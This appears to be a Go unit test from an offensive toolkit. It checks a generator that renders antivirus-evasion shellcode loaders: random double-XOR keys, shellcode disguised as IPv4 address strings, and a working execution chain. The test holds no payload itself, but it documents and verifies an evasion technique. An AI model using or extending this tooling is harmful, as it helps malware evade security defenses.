package server

// evasion_test.go — 免杀模板渲染单测：密钥随机性 + 编解码对称 + 模板替换完整。
import (
	"bytes"
	"fmt"
	"regexp"
	"strings"
	"testing"
)

func TestRenderEvasionLoaderSymmetric(t *testing.T) {
	// 模拟 PIC（含非 4 倍数长度验证 pad）
	pic := []byte{}
	for i := 0; i < 1003; i++ {
		pic = append(pic, byte(i%251))
	}
	for _, tech := range []string{"t1_classic", "t3_sleep"} {
		src, err := renderEvasionLoader(evasionTechniques[tech].Path, pic, `{"server":"1.2.3.4:1"}`)
		if err != nil {
			t.Fatalf("%s: %v", tech, err)
		}
		// 提取渲染后的 IPv4 数据与密钥，反向解码验证对称
		reData := regexp.MustCompile(`(?s)var _ipv4Data = \[\]string\{(.*?)\n\}`).FindStringSubmatch(src)
		if reData == nil {
			t.Fatalf("%s: 渲染后找不到 _ipv4Data", tech)
		}
		addrs := regexp.MustCompile(`"(\d+\.\d+\.\d+\.\d+)"`).FindAllStringSubmatch(reData[1], -1)
		var enc []byte
		for _, m := range addrs {
			var a, b, c, d int
			if _, err := fmt.Sscanf(m[1], "%d.%d.%d.%d", &a, &b, &c, &d); err != nil {
				t.Fatal(err)
			}
			enc = append(enc, byte(a), byte(b), byte(c), byte(d))
		}
		k1 := extractKey(t, src, "_xorKey1")
		k2 := extractKey(t, src, "_xorKey2")
		// 模板 doubleXOR：先 ^k2 再 ^k1
		out := make([]byte, len(enc))
		for i, bb := range enc {
			out[i] = bb ^ k2[i%32] ^ k1[i%32]
		}
		// 前 len(pic)-(pad) 位应等于原 PIC（pad 到 4 倍数）
		pad := (4 - len(pic)%4) % 4
		want := pic[:len(pic)-pad]
		if !bytes.Equal(out[:len(want)], want) {
			t.Errorf("%s: 解码不对称（长度 enc=%d want=%d）", tech, len(enc), len(want))
		}
		// 密钥随机性：两次渲染密钥不同
		src2, err2 := renderEvasionLoader(evasionTechniques[tech].Path, pic, `{"server":"1.2.3.4:1"}`)
		if err2 != nil {
			t.Fatal(err2)
		}
		if extractKey(t, src2, "_xorKey1") == nil || bytes.Equal(extractKey(t, src2, "_xorKey1"), k1) {
			t.Errorf("%s: 两次渲染密钥应随机不同", tech)
		}
		// 模板仍有 main 与执行链
		if !strings.Contains(src, "func main()") {
			t.Errorf("%s: 渲染后缺 main", tech)
		}
	}
}

func extractKey(t *testing.T, src, name string) []byte {
	m := regexp.MustCompile(`var ` + name + ` = \[\]byte\{([^}]*)\}`).FindStringSubmatch(src)
	if m == nil {
		t.Fatalf("缺 %s", name)
	}
	fields := strings.FieldsFunc(m[1], func(r rune) bool { return r == ',' || r == ' ' })
	out := make([]byte, 0, 32)
	for _, f := range fields {
		if f == "" {
			continue
		}
		var v int64
		s := strings.TrimPrefix(f, "0x")
		if _, err := fmt.Sscanf(s, "%x", &v); err != nil {
			t.Fatalf("%s 解析 %q: %v", name, f, err)
		}
		out = append(out, byte(v))
	}
	if len(out) != 32 {
		t.Fatalf("%s 长度 %d != 32", name, len(out))
	}
	return out
}
